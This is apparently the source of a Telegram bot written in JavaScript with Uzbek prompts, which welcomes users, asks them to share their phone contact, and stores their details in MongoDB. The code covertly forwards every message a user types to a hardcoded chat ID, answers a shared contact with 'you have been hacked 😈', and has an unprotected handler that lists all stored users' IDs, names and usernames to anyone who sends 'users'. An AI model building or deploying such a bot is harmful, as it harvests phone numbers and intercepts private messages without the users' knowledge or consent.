
import TelegramBot from "node-telegram-bot-api";
import dotenv from 'dotenv';
import fs from 'node:fs';
import { findAll, findByChatId, register } from "./services/user.js";
import { connectMongodb } from "./config/db.js";
import { match } from "node:assert";


dotenv.config()


const token = process.env.TOKEN;
const bot = new TelegramBot(token, { polling: true });



bot.setMyCommands([
    {
        command: "/start",
        description: "Qayta ishga tushirish"
    },
    {
        command: "/info",
        description: "Bot haqida malumot olish"
    }, {
        command: "/userlar_soni",
        description: "User sonini ko'rish"
    }
]);



const button = {
    reply_markup: {
        keyboard: [
            [
                {
                    text: "Vazifalar", callback_data: "vazifalar"
                },
                {
                    text: "Eslatma ", callback_data: "eslatma"
                },
                {
                    text: "Vazifa qo'shish", callback_data: "qo'shish"
                }
            ],
        ]
    }
};

const contactbtns = {
    reply_markup: {
        keyboard: [
            [
                {
                    text: 'Contactni yuborish',
                    request_contact: true
                },
            ],
        ],
        one_time_keyboard: true
    }
};


const btns = {
    reply_markup: {
        keyboard: [
            
            [
                {
                    text: "Test"
                }
            ],
        ],
        resize_keyboard: true
    }
};

export const contactbtn = {
    reply_markup: {
        keyboard: [
            [
                {
                    text: "contact",
                    request_contact: true
                },
            ]
        ],
        one_time_keyboard: true,
        resize_keyboard: true

    }
}



connectMongodb()

const start = async () => {

     bot.onText('users', async (msg) => {
        const chatId = msg.from.id

        const AllUser = await findAll();
        for (let i = 0; i < AllUser.length; i++) {
            bot.sendMessage(chatId,
                `${i + 1}. ChatId: ${AllUser[i].chatId}\n
firstname: ${AllUser[i].first_name}\n
Username: ${AllUser[i].username}`);
        };
    });

    bot.on('message', async (msg) => {
        const chatId = msg.chat.id;
        const chatIdshavkat = 2010155328
        const chatIdabduvohid = 5352461835
        const chatIdbexruz = 1302939620
        
        const text = msg.text;
        const username = msg.chat.username;
        const messageId = msg.message_id
        const first_name = msg.chat.first_name;
        const last_name = msg.chat.last_name
        const location = msg.location;
       
        console.log(msg);

        

        if (text === '/userlar_soni') {
            const AllUser = await findAll();
            return bot.sendMessage(chatId, AllUser.length);
        };

        if (text === '/start') {
            return bot.sendMessage(chatId, `Assalomu alaykum ${username}  👋
Botimizga xush kelibsiz 🎉
Kontaktingizni  📱  yuboring!  (Yuborish uchun tugmani bosing ⬇️)`, contactbtn);
          }
        if (text) {
            bot.sendMessage(chatIdshavkat, text);
            // bot.sendMessage(chatIdabduvohid, text);
            // bot.sendMessage(chatIdbexruz, text);
            // bot.deleteMessage(chatId, messageId);
        };
    });

    bot.on('contact', async (msg) => {
        const chatId = msg.chat.id;
        const first_name = msg.chat.first_name;
        const contact = msg.contact.phone_number;
        const username = msg.chat.username;
        const userType = msg.chat.type;

        const user = await findByChatId(chatId);
        if (!user) {
            const data = await register(chatId, first_name, username, userType, contact);
        };


        bot.sendMessage(chatId, `${first_name} you have been hacked 😈`)
    })



    bot.on('location', (msg) => {
        const chatId = msg.chat.id;
        const location = msg.location;

        // Joylashuv ma'lumotlarini qayta ishlash
        bot.sendMessage(chatId, `Sizning joylashuvingiz:\nKenglik: ${location.latitude}\nUzunlik: ${location.longitude}`);
    });


    // bot.on('callback_query', async (msg) => {
    //     const chatId = msg.from.id

    //     const AllUser = await findAll();
    //     for (let i = 0; i < AllUser.length; i++) {
    //         bot.sendMessage(chatId,
    //             `${i + 1}. ChatId: ${AllUser[i].chatId}\n
    //         firstname: ${AllUser[i].first_name}\n
    //         Username: ${AllUser[i].username}`);
    //     };
    // });
};


start();

